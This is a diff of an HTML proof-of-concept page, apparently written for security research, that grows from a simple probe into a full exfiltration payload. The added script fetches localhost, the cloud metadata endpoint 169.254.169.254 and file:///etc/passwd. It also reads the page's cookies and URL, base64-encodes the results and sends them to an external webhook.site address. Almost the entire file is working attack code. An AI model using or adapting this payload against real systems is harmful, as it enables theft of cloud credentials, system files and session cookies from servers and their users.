@@ -1,21 +1,42 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Minimal Proof</title>
+    <title>Security Research PoC</title>
 </head>
 <body>
-    <img src="https://webhook.site/5d2815a1-7a4c-4d21-9462-22b22be8d349/START_PROOF">
+    <script>
+        const hook = "https://webhook.site/5d2815a1-7a4c-4d21-9462-22b22be8d349";
 
-    <style>
-        @import url("http://127.0.0.1:80/favicon.ico?v=proof");
-        @import url("http://169.254.169.254/latest/meta-data/?v=proof");
-    </style>
+        // Функция для отправки данных в Base64
+        function send(label, data) {
+            const b64 = btoa(unescape(encodeURIComponent(data))).substring(0, 1000);
+            new Image().src = `${hook}/DATA_${label}?content=${b64}`;
+        }
 
-    <img src="http://127.0.0.1:80/" 
-         onerror="new Image().src='https://webhook.site/5d2815a1-7a4c-4d21-9462-22b22be8d349/DETECTED_INTERNAL_SERVICE_80';"
-         onload="new Image().src='https://webhook.site/5d2815a1-7a4c-4d21-9462-22b22be8d349/READ_INTERNAL_SUCCESS';">
+        // 1. Пытаемся прочитать содержимое локального хоста (Full SSRF Proof)
+        fetch("http://127.0.0.1:80/")
+            .then(r => r.text())
+            .then(text => send("LOCAL_80", text))
+            .catch(e => send("ERROR_LOCAL_80", e.message));
 
-    <link rel="prefetch" href="http://169.254.169.254/latest/meta-data/instance-id" 
-          onload="new Image().src='https://webhook.site/5d2815a1-7a4c-4d21-9462-22b22be8d349/METADATA_ACCESSED';">
+        // 2. Пытаемся достать метаданные облака (AWS/Azure/Google)
+        fetch("http://169.254.169.254/latest/meta-data/")
+            .then(r => r.text())
+            .then(text => send("METADATA", text))
+            .catch(e => send("ERROR_META", e.message));
+
+        // 3. Пытаемся прочитать системный файл (LFI через браузер)
+        fetch("file:///etc/passwd")
+            .then(r => r.text())
+            .then(text => send("PASSWD", text))
+            .catch(e => send("ERROR_PASSWD", e.message));
+
+        // 4. Отправляем куки и заголовки (XSS Proof)
+        send("COOKIES", document.cookie || "no_cookies");
+        send("LOCATION", window.location.href);
+
+    </script>
+    
+    <img src="http://127.0.0.1:80/favicon.ico" onerror="new Image().src='https://webhook.site/5d2815a1-7a4c-4d21-9462-22b22be8d349/IMG_ERROR_80';">
 </body>
 </html>
